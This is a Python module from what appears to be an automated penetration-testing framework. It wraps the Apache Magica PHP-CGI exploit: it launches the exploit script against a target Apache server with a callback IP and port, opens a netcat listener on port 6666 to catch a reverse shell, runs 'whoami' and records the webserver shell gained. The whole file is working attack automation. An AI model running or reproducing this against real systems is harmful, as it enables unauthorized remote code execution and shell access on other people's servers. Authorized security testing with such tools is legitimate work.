import logging
from subprocess import Popen, DEVNULL
from typing import Tuple, Dict
from pinaht.knowledge.manager import BufferedModuleManager
from pinaht.knowledge.precondition import Precondition, MetaPrecondition
from pinaht.knowledge.precondition_factory.preconditions import check_type, check_value
from pinaht.knowledge.precondition_factory.metapreconditions import is_parent, merge
from pinaht.knowledge.types.ipaddress import IPAddress
from pinaht.knowledge.types.knowledge import Knowledge
from pinaht.knowledge.types.localhost import LocalHost
from pinaht.knowledge.types.name import Name
from pinaht.knowledge.types.port import Port
from pinaht.knowledge.types.privilege import Privilege
from pinaht.knowledge.types.processshell import ProcessShell, ShellSpawnError
from pinaht.knowledge.types.service import Service
from pinaht.knowledge.types.target import Target
from pinaht.knowledge.types.user import User
from pinaht.modules.module import Module


class ApacheMagicaModule(Module):
    """
    Executes the Apache Magica exploit for Apache servers with PHP version < 5.3.12 / < 5.4.2.

    Exploit-DB: https://www.exploit-db.com/exploits/29290
    """

    def __init__(self, manager, file_manager, **kwargs):
        super().__init__(manager, **kwargs)

        self._logger = logging.getLogger("ApacheMagicaModule")

        self.file_manager = file_manager

        self.estimated_time = 1
        self.success_chance = 1

    def _generate_precondition_dnf(self) -> Dict[str, Tuple[Dict[str, Precondition], MetaPrecondition]]:
        """
        Generates the preconditions
        """
        # TODO: Add PHP version precondition
        target_precondition = check_type(Target)
        ip_address_precondition = check_type(IPAddress)
        localhost_precondition = check_type(LocalHost)
        reverse_ip_address_precondition = check_type(IPAddress)
        service_precondition = check_type(Service)
        service_name_precondition = check_value(Name("Apache httpd"))
        service_port_precondition = check_type(Port)

        return {
            "meta": (
                {
                    "target": target_precondition,
                    "ip_address": ip_address_precondition,
                    "localhost": localhost_precondition,
                    "reverse_ip_address": reverse_ip_address_precondition,
                    "service": service_precondition,
                    "service_name": service_name_precondition,
                    "service_port": service_port_precondition,
                },
                merge(
                    [
                        is_parent("target", ["ip_address", "service"]),
                        is_parent("localhost", ["reverse_ip_address"]),
                        is_parent("service", ["service_name", "service_port"]),
                    ]
                ),
            )
        }

    def execute(
        self, buffered_module_manager: BufferedModuleManager, meta_key: str, keyed_knowledge: Dict[str, Knowledge]
    ):
        """
        Executes the exploit
        """
        target = keyed_knowledge["target"]
        ip_address = keyed_knowledge["ip_address"]
        reverse_ip_address = keyed_knowledge["reverse_ip_address"]
        port = keyed_knowledge["service_port"]
        protocol = "http"
        reverse_port = "6666"

        exploit_path = self.file_manager.get_file_path(type(self).__name__, "apache-magica", sanitized=True)
        exploit_command = [
            "/bin/bash",
            "-c",
            f"sleep 1; {exploit_path} --target {ip_address} --port {port} --protocol {protocol}"
            f" --reverse-ip {reverse_ip_address} --reverse-port {reverse_port}",
        ]
        reverse_shell_command = f"nc -n -lvp {reverse_port}"

        try:
            self._logger.debug(f'running exploit command "{exploit_command}"')
            Popen(exploit_command, stdout=DEVNULL)

            self._logger.debug(f'running reverse shell command "{reverse_shell_command}"')
            shell = ProcessShell(reverse_shell_command)

            username = shell.execute("whoami")[0]

            buffered_module_manager.report(f"Executing {exploit_command!s}")
            buffered_module_manager.report(f"Executing {reverse_shell_command!s}")
            buffered_module_manager.report(f"Exploit successful, opened shell with username {username!s}")

            self._logger.info("exploit succeeded")
            buffered_module_manager.add_knowledge(shell, "privilege", Privilege.WEBSERVER, 1.0)
            buffered_module_manager.add_knowledge(shell, "shelluser", User(username), 1.0)
            buffered_module_manager.add_knowledge(target, "shells", shell, 1.0)
        except (ShellSpawnError):
            self._logger.error("exploit failed")
